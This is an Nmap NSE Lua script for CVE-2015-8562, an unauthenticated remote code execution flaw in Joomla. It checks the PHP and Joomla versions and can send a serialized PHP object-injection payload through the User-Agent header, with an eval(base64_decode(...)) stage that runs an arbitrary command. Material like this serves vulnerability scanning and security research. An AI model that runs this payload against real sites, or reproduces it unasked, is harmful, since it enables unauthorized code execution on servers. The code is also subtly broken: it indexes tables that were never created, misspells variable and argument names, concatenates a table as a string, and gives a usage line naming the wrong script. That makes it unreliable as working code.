local base64 = require 'base64'
local http = require "http"
local table = require "table"
local shortport = require "shortport"
local slaxml = require "slaxml"
local stdnse = require "stdnse"
local string = require "string"
local unicode = require "unicode"
local vulns = require "vulns"

description = [[Joomla! has a an unauthenticated remote code execution vulnerability in all versions from 1.5.0 to 3.4.5
by using unsanitized User-Agent/HTTP_X_FORWARDED_FOR headers. PHP versions after 5.4.45 excluding 5.5.29 or 5.6.13
are not vulnerable as they check for invalid session data.
]]

---
-- @usage
-- nmap --script http-webdav-scan -p80,443 <target>
--
-- @output
--
-- @args http-vuln-cve2015-8562.path The path to start in; eg, <code>"/web/"</code> will try <code>"/web/xxx"</code>.
-- @args http-vuln-cve2015-8562.exploit Exploit if version checking passes, tries 'phpinfo()' by default.
-- @args http-vuln-cve2015-8562.command The custom command to use instead of 'phpinfo()'
-- @xmloutput


-----------------------------------------------------------------------

author = "Gyanendra Mishra"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {
  "exploit",
  "intrusive",
  "vuln",
}


portrule = shortport.http

local function get_payload(random_string)
  p1 = stdnse.generate_random_string(5) .. '}__' .. stdnse.generate_random_string(10)..'|'
  p2 = 'O:21:"JDatabaseDriverMysqli":3:{s:4:"\0\0\0a";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";'
  p3 = "eval(base64_decode($_SERVER['HTTP_" .. random_string .. "']));JFactory::getConfig();exit;"
  p4 = '";}i:1;s:4:"init";}}s:13:"\0\0\0connection";i:1;}𝌆'
  return p1 .. {p2} .. 's:' ..p3:len()..':\"' ..p3 .. p4
end

function action (host, port)

  local path = stdnse.get_script_args(SCRIPT_NAME .. ".path") or "/"
  local exploit = stdnse.get_script_args(SCRIPT_NAME .. ".exploiot") or false
  local command = stdnse.get_script_args(SCRIPT_NAME .. ".command") or 'phpinfo()'
  local response = http.get(host, port, path)
  if response and response.status ~= 200 then
    return nil
  end

  local is_php_vulnerable=nil

  if not response.header['x-powered-by'] then
    return nil
  else
    local php_version =  string.match(response.header['x-powered-by'],'PHP%/([%d%.]+)')
    local ubuntu_version = string.match(response.header['x-powered-by'],'ubuntu([%d%.]+)') or false
    local is_deb = string.match(response.header['x-powered-by'],'deb') or false
    stdnse.debug1(php_version)
    stdnse.debug1(response.header['x-powered-by'])
    if is_deb then
      if php_version > '5.4.45' then
        is_php_vulnerable=false
      --confirm the below check once
      elseif php_version > '5.4.45' and response.header['x-powered-by']:match('7[u%.]1') then
        is_php_vulnerable=false
      else
        is_php_vulnerable=true
      end
    elseif ubuntu_version then
      if php_version > '5.5.9' then
        is_php_vulnerable=false
      elseif php_version=='5.5.9' and ubuntu_version >= '4.13' then
        is_php_vulnerable=false
      elseif php_version=='5.3.10' and ubuntu_version >= '3.20' then
        is_php_vulnerable=false
      else
        is_php_vulnerable=true
      end
    elseif php_version < '5.4.44' then
      is_php_vulnerable=true
    elseif php_version>= '5.5.0' and php_version<='5.5.28' then
      is_php_vulnerable=true
    elseif php_version>= '5.6.0' and php_version<='5.6.12' then
      is_php_vulnerable=true
    end
  end


  if not is_php_vulnerable then
    stdnse.debug1('This version of PHP looks safe!')
    return nil
  end
        

  local paths = {'/', '/administartor/'}
  local joomla_and_online = false

  local normalized_path = nil
  for _, subpath in pairs(paths) do
    normalized_path = string.gsub(path .. subpath, "//", "/")
    response = http.get(host, port, normalized_path)
    if response and response.status==200 then
      if string.match(response.body, '<meta name="generator" content="Joomla!') then
        joomla_and_online = true
        break
      end
    end
  end

  if not joomla_and_online then
    stdnse.debug1("Joomla not found on target!")
    return nil
  end

  normalized_path = string.gsub(path .. 'administrator/manifests/files/joomla.xml', '//', '/')
  response = http.get(host, port, normalized_path)
  local joomla_version = nil
  if response and response.status == 200 then
    local parser = slaxml.parser:new()
    parser._call = {startElement = function(name)
        if name =='version' then parser._call.text = function(content) joomla_version = content end end end,
        closeElement = function(name) parser._call.text = function() return nil end end
    }
    parser:parseSAX(response.body, {stripWhitespace=true})
  end

  if joomla_version < '3.4.6' then

    local vuln_table = {
      title = "Joomla HTTP Header Unauthenticated Remote Code Execution",
      state = vulns.STATE.VULN,
      risk_factor = "High",
      references = {
        'https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html',
        'https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html',
        'https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html'
      },
      IDS = {
        CVE = 'CVE-2015-8562'
      },
      scores = {
        CVSS2 =  '7.5'
      },
      description = [[Joomla suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5 due to 
      storage of unsanitized headers in session data.]]
    }

    
    if exploit then
      options = {}
      local random_string = stdnse.generate_random_string(5):upper()
      options['header']['User-Agent'] = get_payload(random_string)
      reseponse = http.get(host, port, path, options)
      local session_cookeis  = response.cookies
      options['header'][random_string] = base64.enc(command)
      response = http.get(host, port, path, options)
    else
      local report = vulns.Report:new(SCRIPT_NAME, host, port)
      return report:make_output(vuln_table)
    end
  end

end

